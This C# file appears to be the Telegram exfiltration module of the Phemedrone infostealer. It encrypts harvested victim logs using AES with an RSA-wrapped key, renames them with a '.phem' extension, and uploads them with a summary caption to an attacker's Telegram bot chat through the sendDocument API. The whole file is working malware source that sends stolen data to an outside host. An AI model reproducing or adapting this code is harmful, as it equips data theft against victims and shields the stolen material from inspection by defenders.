using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using System.Xml.Serialization;
using Phemedrone.Services;

namespace Phemedrone.Senders
{
    public class Telegram : ISender
    {
        /// <summary>
        /// Specifies Telegram bot API as a sender service for logs.
        /// </summary>
        /// <param name="token">Telegram bot token</param>
        /// <param name="chatId">Your Telegram chat id</param>
        /// /// <param name="publicKey">Generated Public key from RSA key pair</param>
        public Telegram(string token, string chatId, string publicKey) : base(token, chatId, publicKey)
        {
        }

        public override void Send(byte[] data)
        {
            var key = DeserializeKey(Arguments.Last().ToString());
            data = Encrypt(data, key);

            var fileName = Information.GetFileName();
            fileName = fileName.Substring(0, fileName.Length - 4) + ".phem";
            var caption = Information.GetSummary();
            
            MakeFormRequest($"https://api.telegram.org/bot{Arguments.First()}/sendDocument", "document", fileName, data,
                new KeyValuePair<string, string>("chat_id", Arguments[1].ToString()),
                new KeyValuePair<string, string>("parse_mode", "MarkdownV2"),
                new KeyValuePair<string, string>("caption", caption));
        }

        private static RSAParameters DeserializeKey(string publicKey)
        {
            var ser = new XmlSerializer(typeof(RSAParameters));
            RSAParameters parameters;
            using (var reader = XmlReader.Create(new MemoryStream(Encoding.UTF8.GetBytes(publicKey))))
            {
                parameters = (RSAParameters)ser.Deserialize(reader);
            }

            return parameters;
        }

        private static byte[] Encrypt(byte[] data, RSAParameters publicKey)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.ImportParameters(publicKey);
                
                using (var aes = Aes.Create())
                {
                    aes.GenerateKey();
                    var symmetricKey = aes.Key;
                    var plainVector = aes.IV;
                    
                    byte[] encryptedData;
                    using (var memoryStream = new MemoryStream())
                    {
                        using (var cryptoStream =
                               new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(data, 0, data.Length);
                            cryptoStream.FlushFinalBlock();
                            encryptedData = memoryStream.ToArray();
                        }
                    }

                    var encryptedSymmetricKey = rsa.Encrypt(symmetricKey, true);
                    var encryptedResult = new byte[encryptedSymmetricKey.Length + plainVector.Length + encryptedData.Length];
                    
                    Buffer.BlockCopy(encryptedSymmetricKey, 0, encryptedResult, 0, encryptedSymmetricKey.Length);
                    Buffer.BlockCopy(plainVector, 0, encryptedResult, encryptedSymmetricKey.Length, plainVector.Length);
                    Buffer.BlockCopy(encryptedData, 0, encryptedResult, encryptedSymmetricKey.Length + plainVector.Length, encryptedData.Length);

                    return encryptedResult;
                }
            }
        }
    }
}